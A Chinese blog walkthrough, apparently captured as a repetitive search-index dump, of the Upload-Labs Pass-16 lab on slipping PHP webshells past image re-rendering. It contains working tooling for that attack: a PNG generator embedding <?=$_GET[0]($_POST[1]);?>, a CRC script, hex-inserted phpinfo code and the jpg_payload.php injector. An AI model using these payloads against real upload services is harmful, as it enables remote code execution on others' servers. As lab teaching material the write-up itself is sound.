if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else if(($fileext == \"png\") \u0026\u0026 ($filetype==\"image/png\")){ ...... }else if(($fileext == \"gif\") \u0026\u0026 ($filetype==\"image/gif\")){ ..... }else{ $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; } } ​ 提示：本pass重新渲染了图片！。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。 ​ 首先是分析一波源码： ​ 以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行move_uploaded_file函数先把文件移动到upload文件夹，现在文件路径是$target_path，之后对图片进行二次渲染。 ​ 二次渲染用到了imagecreatefromjpeg函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行unlink函数删除文件，否则，为新图片随机一个名称，执行imagejpeg函数把图象输出到新文件 $newfilename。再将之前用户上传的文件$target_path删除掉。 ​ 根据上面的分析就能得出来两种思路： 访问二次渲染之前的上传的文件。 在图片二次渲染以后图片马未失效。 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#pass-16"},{"categories":["DROPS"],"content":"第一种方法​ （Linux环境、php版本7.2.21） ​ 因为二次渲染那部分if、else无论如何都会执行unlink函数删除你的文件，需要在执行imagecreatefromjpeg时报错才能访问到自己原来上传的文件。 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#第一种方法"},{"categories":["DROPS"],"content":"jpg格式准备并上传​ 需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。 文件包含验证​ 上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用inclue.php文件包含访问刚刚上传的文件 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:3:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#jpg格式"},{"categories":["DROPS"],"content":"jpg格式准备并上传​ 需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。 文件包含验证​ 上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用inclue.php文件包含访问刚刚上传的文件 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:3:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#准备并上传"},{"categories":["DROPS"],"content":"jpg格式准备并上传​ 需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。 文件包含验证​ 上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用inclue.php文件包含访问刚刚上传的文件 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:3:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#文件包含验证"},{"categories":["DROPS"],"content":"其他格式​ 如图成功访问就是图片马上传成功了。但是这个方法我只有jpg格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解imagecreatefromjpeg、imagecreatefrompng、imagecreatefromgif，这三个函数的原理，让其报错即可。 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:3:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#其他格式"},{"categories":["DROPS"],"content":"第二种方法​ （windows环境，php版本5.2.17） ​ 这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。 ​ 用到的工具是Beyond Compare 4，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#第二种方法"},{"categories":["DROPS"],"content":"GIF格式准备并上传​ 上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。 文件比较​ 使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。\u003c?php phpinfo(); ?\u003e的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。 文件包含验证​ 上传以后进行文件包含，代码执行成功。 ​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#gif格式"},{"categories":["DROPS"],"content":"GIF格式准备并上传​ 上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。 文件比较​ 使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。 文件包含验证​ 上传以后进行文件包含，代码执行成功。 ​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#准备并上传-1"},{"categories":["DROPS"],"content":"GIF格式准备并上传​ 上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。 文件比较​ 使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。 文件包含验证​ 上传以后进行文件包含，代码执行成功。 ​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#文件比较"},{"categories":["DROPS"],"content":"GIF格式准备并上传​ 上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。 文件比较​ 使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。 文件包含验证​ 上传以后进行文件包含，代码执行成功。 ​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#文件包含验证-1"},{"categories":["DROPS"],"content":"png格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc) 准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?\u003e ​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是\u003c?=$_GET[0]($_POST[1]);?\u003e，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#png格式"},{"categories":["DROPS"],"content":"png格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc) 准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 ​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#计算crc码"},{"categories":["DROPS"],"content":"png格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc) 准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 ​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#准备"},{"categories":["DROPS"],"content":"png格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc) 准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 ​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#计算crc码-1"},{"categories":["DROPS"],"content":"png格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc) 准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 ​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#直接生成图片写入实际数据模块"},{"categories":["DROPS"],"content":"jpg格式​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码 ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php \u003cjpg_name.jpg\u003e In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\u003c?=phpinfo();?\u003e\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php \u003cjpg_name.jpg\u003e'); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad \u003c 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u003ereadShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-\u003eeof()) \u0026\u0026 ($dis-\u003ereadByte() == 0xFF)) { $marker = $dis-\u003ereadByte(); $size = $dis-\u003ereadShort() - 2; $dis-\u003eskip($size); if($marker === 0xDA) { $startPos = $dis-\u003eseek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u003eeof())) { if($dis-\u003ereadByte() === 0xFF) { if($dis-\u003ereadByte !== 0x00) { break; } } } $stopPos = $dis-\u003eseek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u003ebinData = ''; $this-\u003eorder = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-\u003ebinData = file_get_contents($filename); } else { $this-\u003ebinData = $filename; } $this-\u003esize = strlen($this-\u003ebinData); } public function seek() { return ($this-\u003esize - strlen($this-\u003ebinData)); } public function skip($skip) { $this-\u003ebinData = substr($this-\u003ebinData, $skip); } public function readByte() { if($this-\u003eeof()) { die('End Of File'); } $byte = substr($this-\u003ebinData, 0, 1); $this-\u003ebinData = substr($this-\u003ebinData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u003ebinData) \u003c 2) { die('End Of File'); } $short = substr($this-\u003ebinData, 0, 2); $this-\u003ebinData = substr($this-\u003ebinData, 2); if($this-\u003eorder) { $short = (ord","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:3","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#jpg格式-1"},{"categories":["DROPS"],"content":"jpg格式​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码 ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-eof()) \u0026\u0026 ($dis-readByte() == 0xFF)) { $marker = $dis-readByte(); $size = $dis-readShort() - 2; $dis-skip($size); if($marker === 0xDA) { $startPos = $dis-seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-eof())) { if($dis-readByte() === 0xFF) { if($dis-readByte !== 0x00) { break; } } } $stopPos = $dis-seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-binData = ''; $this-order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-binData = file_get_contents($filename); } else { $this-binData = $filename; } $this-size = strlen($this-binData); } public function seek() { return ($this-size - strlen($this-binData)); } public function skip($skip) { $this-binData = substr($this-binData, $skip); } public function readByte() { if($this-eof()) { die('End Of File'); } $byte = substr($this-binData, 0, 1); $this-binData = substr($this-binData, 1); return ord($byte); } public function readShort() { if(strlen($this-binData) binData, 0, 2); $this-binData = substr($this-binData, 2); if($this-order) { $short = (ord","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:3","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#准备-1"},{"categories":["DROPS"],"content":"jpg格式​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码 ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-eof()) \u0026\u0026 ($dis-readByte() == 0xFF)) { $marker = $dis-readByte(); $size = $dis-readShort() - 2; $dis-skip($size); if($marker === 0xDA) { $startPos = $dis-seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-eof())) { if($dis-readByte() === 0xFF) { if($dis-readByte !== 0x00) { break; } } } $stopPos = $dis-seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } 